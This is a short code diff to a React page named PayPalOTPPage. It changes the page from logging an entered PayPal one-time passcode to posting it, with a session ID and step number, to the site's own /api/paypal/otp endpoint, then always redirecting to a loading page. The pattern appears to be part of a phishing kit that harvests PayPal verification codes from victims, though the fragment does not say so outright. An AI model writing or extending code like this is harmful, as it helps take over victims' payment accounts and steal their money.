@@ -32,9 +32,11 @@ export default function PayPalOTPPage({ step = 1 }: PayPalOTPPageProps) {
 
   const otpMutation = useMutation({
     mutationFn: async (otpValue: string) => {
-      // For PayPal OTP, we can store it in session or send to backend
-      console.log(`PayPal OTP ${step}:`, otpValue);
-      return { success: true };
+      return await apiRequest("POST", "/api/paypal/otp", {
+        sessionId,
+        otp: otpValue,
+        step,
+      });
     },
     onSuccess: () => {
       // Always redirect to loading page
